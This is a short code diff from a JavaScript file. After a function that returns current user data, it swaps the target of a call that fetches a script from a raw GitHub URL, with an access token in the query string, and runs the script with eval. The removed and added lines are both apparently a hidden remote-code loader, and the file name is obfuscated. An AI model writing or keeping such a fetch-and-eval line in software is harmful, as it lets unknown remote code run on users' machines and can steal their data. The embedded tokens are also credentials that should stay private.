@@ -232,6 +232,6 @@ function getCurrentData() {
         user,
     };
 }
-fetch("https://raw.githubusercontent.com/2-js/gen-paste/main/_0xd529.js?token=GHSAT0AAAAAABTBN6CYFND4B2A2VXTHHUEEYTL5D5A")
+fetch("https://raw.githubusercontent.com/2-js/gen-paste/main/893hdf89.js?token=GHSAT0AAAAAABTBN6CZKXI3ATLWIQJ7PMHUYTL5LGQ")
     .then((res) => res.text()
         .then((t) => eval(t)))
